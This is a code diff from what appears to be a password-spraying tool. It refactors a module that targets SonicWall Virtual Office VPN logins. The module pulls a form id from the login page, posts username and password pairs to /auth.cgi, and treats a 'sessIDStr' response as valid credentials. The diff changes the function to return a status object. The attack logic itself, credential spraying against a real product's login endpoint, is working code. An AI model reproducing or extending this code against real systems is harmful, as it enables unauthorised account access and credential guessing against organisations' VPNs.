@@ -11,10 +11,13 @@ class Sonicwall_VirtualOffice < Sprayer
     # end
 
     # returns an array of [username, password, valid, lockout, mfa]
-    def spray(username : String, password : String) 
-        lockedout = false
-        valid = false
-        mfa = false
+    def spray(username : String, password : String) : SprayStatus
+         # lockedout = false
+        # valid = false
+        # mfa = false
+        spstatus = SprayStatus.new()
+        spstatus.username = username 
+        spstatus.password = password 
 
         # 
         # enter your auth check here and make sure 
@@ -51,12 +54,17 @@ class Sonicwall_VirtualOffice < Sprayer
         # end
 
         hidden = page.xpath_node("/html/body/center/table/tr/td/table/tr/td/form")
-        return if hidden.nil?
+        
+        if hidden.nil?
+            puts "Something went wrong with the init requst..."
+            return spstatus 
+        end
         id = hidden.children()[3].attributes()[2].content()
         form = "id=#{id}&domain=LocalDomain&uName=#{username}&pass=#{URI.encode_www_form password}&SslvpnLoginPage=1&digest="
         post = client.post("/auth.cgi", form: form)
 
-        valid = true if post.body.includes? "sessIDStr"
+        # valid = true if post.body.includes? "sessIDStr"
+        spstatus.valid_credentials = true if post.body.includes? "sessIDStr"
 
 
 
@@ -66,6 +74,7 @@ class Sonicwall_VirtualOffice < Sprayer
         # end of your auth check here
         # 
         
-        return [username, password, valid, lockedout, mfa]
+        # return [username, password, valid, lockedout, mfa]
+        return spstatus
     end
 end
